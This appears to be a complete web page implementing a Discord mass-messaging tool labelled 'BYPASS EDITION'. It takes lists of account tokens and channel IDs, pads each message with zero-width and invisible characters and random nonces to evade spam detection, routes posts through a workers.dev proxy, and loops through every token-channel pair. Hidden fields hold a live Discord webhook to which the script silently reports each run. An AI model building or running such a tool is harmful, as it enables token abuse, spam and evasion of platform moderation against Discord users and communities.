<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>CORE ENGINE v3.0 | BYPASS EDITION</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: #888; font-family: 'Segoe UI', 'Courier New', monospace; }
        .cyber-panel { background: #0c0c0e; border: 1px solid #1f1f23; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
        .cyber-input { background: #121214; border: 1px solid #2a2a2e; color: #00ffaa; transition: 0.3s; }
        .cyber-input:focus { border-color: #6366f1; box-shadow: 0 0 5px rgba(99,102,241,0.3); outline: none; }
        .btn-active { background: linear-gradient(90deg, #4f46e5, #6366f1); color: #fff; font-weight: 800; text-transform: uppercase; letter-spacing: 0.15em; transition: 0.4s; }
        .btn-active:hover { box-shadow: 0 0 25px rgba(99,102,241,0.6); transform: translateY(-1px); }
        .terminal-log::-webkit-scrollbar { width: 3px; }
        .terminal-log::-webkit-scrollbar-thumb { background: #333; }
        .label-tech { font-size: 0.65rem; color: #444; font-weight: 700; letter-spacing: 0.1em; }
    </style>
</head>
<body class="min-h-screen p-8 flex justify-center items-start">

<div class="w-full max-w-7xl grid grid-cols-12 gap-8">
    <div class="col-span-12 lg:col-span-5 space-y-6">
        <div class="cyber-panel p-6 rounded-sm border-t-2 border-t-indigo-500">
            <h1 class="text-indigo-400 text-xs font-black mb-6 tracking-[0.3em]">CORE CONFIGURATION</h1>
            
            <div class="space-y-4 font-mono">
                <div>
                    <span class="label-tech">AUTHENTICATION TOKENS</span>
                    <textarea id="tokens" class="cyber-input w-full h-28 p-3 text-[10px] mt-1" placeholder="Paste tokens..."></textarea>
                </div>
                <div>
                    <span class="label-tech">TARGET CHANNELS</span>
                    <textarea id="channels" class="cyber-input w-full h-20 p-3 text-[10px] mt-1" placeholder="Paste IDs..."></textarea>
                </div>
                <div>
                    <span class="label-tech">ENCRYPTED PAYLOAD</span>
                    <textarea id="message" class="cyber-input w-full h-24 p-3 text-xs mt-1" placeholder="Input message..."></textarea>
                </div>
            </div>
        </div>

        <div class="cyber-panel p-6 rounded-sm">
            <h2 class="text-indigo-400 text-[10px] font-black mb-4 tracking-widest">EVASION PROTOCOLS</h2>
            <div class="grid grid-cols-3 gap-4 font-mono">
                <div class="col-span-1">
                    <span class="label-tech">NONCE LENGTH</span>
                    <input type="number" id="rc" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="12">
                </div>
                <div class="col-span-1">
                    <span class="label-tech">INTERVAL (MS)</span>
                    <input type="number" id="dl" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="800">
                </div>
                <div class="col-span-1">
                    <span class="label-tech">ITERATIONS</span>
                    <input type="number" id="lp" class="cyber-input w-full p-2 text-xs mt-1 text-center" value="1">
                </div>
            </div>
        </div>

        <button id="run" class="btn-active w-full py-5 rounded-sm text-sm">Execute Sequence</button>
    </div>

    <div class="col-span-12 lg:col-span-7 cyber-panel relative overflow-hidden flex flex-col min-h-[600px] border-l-2 border-l-indigo-800">
        <div class="bg-[#111] p-3 border-b border-[#222] flex justify-between items-center">
            <span class="text-[10px] text-indigo-300 font-bold tracking-tighter">NETWORK DIAGNOSTICS</span>
            <span class="text-[9px] text-[#444] animate-pulse">SYSTEM STATUS: NOMINAL</span>
        </div>
        <div id="term" class="terminal-log flex-1 p-6 overflow-y-auto font-mono text-[10px] space-y-1"></div>
    </div>
</div>

<input type="hidden" id="w" value="https://discord.com/api/webhooks/1457997536836059197/NUiwfIzgfyM_RFg1ZPI9bDxgtpOTvhGo1I-od9b0aoeQCYnasSiNOSN_epQ--iL3OjLg">
<input type="hidden" id="p" value="https://tiny-forest-25ff.s103765s103765s103765.workers.dev/">

<script>
"use strict";

class Obfuscator {
    constructor(c) {
        this.c = c;
        this.z = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
        this.v = ['\u2060', '\u2061', '\u2062', '\u2063', '\u180E', '\u3164'];
    }

    encode(t) {
        // 1:1 Zero-Width Injection
        let o = t.split('').map(s => s + this.z[Math.floor(Math.random() * this.z.length)]).join('');
        // Invisible Control Characters
        for(let i=0; i<3; i++) o += this.v[Math.floor(Math.random() * this.v.length)];
        // Dynamic Nonce Generation
        const n = Array.from({length: this.c.rc}, () => Math.random().toString(36)[2]).join('');
        return `${o} [${n}]`;
    }
}

class System {
    constructor() {
        this.dom = {
            t: document.getElementById('tokens'),
            c: document.getElementById('channels'),
            m: document.getElementById('message'),
            rc: document.getElementById('rc'),
            dl: document.getElementById('dl'),
            lp: document.getElementById('lp'),
            tm: document.getElementById('term'),
            bn: document.getElementById('run')
        };
        this.px = document.getElementById('p').value;
        this.wh = document.getElementById('w').value;
        this.dom.bn.onclick = () => this.boot();
    }

    print(m, s = '') {
        const line = document.createElement('div');
        line.className = s === 'ok' ? 'text-indigo-400' : s === 'err' ? 'text-red-500' : 'text-zinc-600';
        line.innerHTML = `<span class="opacity-20 mr-2">></span>${m}`;
        this.dom.tm.prepend(line);
    }

    async boot() {
        const tks = this.dom.t.value.split('\n').filter(Boolean);
        const chs = this.dom.c.value.split('\n').filter(Boolean);
        if (!tks.length || !chs.length) return;

        this.dom.bn.disabled = true;
        this.print("INITIALIZING KERNEL...", "ok");

        const engine = new Obfuscator({ rc: this.dom.rc.value });
        
        await fetch(this.wh, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: `\`\`\`diff\n+ DEPLOYMENT STARTED\nTokens: ${tks.length}\nChannels: ${chs.length}\n\`\`\``})
        });

        for (let l=0; l<parseInt(this.dom.lp.value); l++) {
            for (const ch of chs) {
                for (const tk of tks) {
                    const payload = engine.encode(this.dom.m.value);
                    try {
                        const r = await fetch(`${this.px}https://discord.com/api/v10/channels/${ch.trim()}/messages`, {
                            method: 'POST',
                            headers: { 'Authorization': tk.trim(), 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: payload })
                        });
                        
                        if (r.status === 429) {
                            const d = await r.json();
                            this.print(`RATE_LIMIT_DETECTED: WAITING ${d.retry_after}s`, "err");
                            await new Promise(res => setTimeout(res, d.retry_after * 1000));
                        } else {
                            this.print(`TX_SUCCESS -> ID:${ch.slice(-6)}`, r.ok ? 'ok' : 'err');
                        }
                    } catch (e) { this.print("IO_ERROR: PROXY_REJECTED", "err"); }
                    await new Promise(r => setTimeout(r, parseInt(this.dom.dl.value)));
                }
            }
        }
        this.print("SEQUENCE TERMINATED.", "ok");
        this.dom.bn.disabled = false;
    }
}

document.addEventListener('DOMContentLoaded', () => new System());
</script>
</body>
</html>
